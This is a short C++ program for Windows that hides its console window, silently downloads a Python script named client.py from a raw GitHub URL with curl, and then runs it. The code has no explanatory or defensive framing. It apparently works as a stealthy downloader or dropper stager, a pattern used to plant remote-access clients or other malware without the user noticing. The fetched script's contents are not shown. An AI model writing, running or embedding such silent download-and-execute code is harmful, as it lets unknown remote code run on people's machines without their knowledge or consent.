#include <windows.h>
#include <iostream>

void runCommandSilently(const std::string& command) {
    // Prepare process structures
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};

    // Configure STARTUPINFO to hide the window
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Hide the window

    // Convert command to writable format for CreateProcess
    char cmd[1024];
    strncpy(cmd, command.c_str(), sizeof(cmd));
    cmd[sizeof(cmd) - 1] = '\0';

    // Create the process
    if (!CreateProcess(
        NULL,                // No module name (use command line)
        cmd,                 // Command to run
        NULL,                // Process handle not inheritable
        NULL,                // Thread handle not inheritable
        FALSE,               // Set handle inheritance to FALSE
        CREATE_NO_WINDOW,    // Create without a console window
        NULL,                // Use parent's environment block
        NULL,                // Use parent's starting directory 
        &si,                 // Pointer to STARTUPINFO structure
        &pi                  // Pointer to PROCESS_INFORMATION structure
    )) {
        std::cerr << "Failed to execute command: " << command << std::endl;
    } else {
        // Wait for the process to complete
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

int main() {
    // Download the file silently
    runCommandSilently("curl -O https://raw.githubusercontent.com/prog-ammar/Website/refs/heads/main/client.py");

    // Execute the Python script silently
    runCommandSilently("python client.py");

    return 0;
    
}
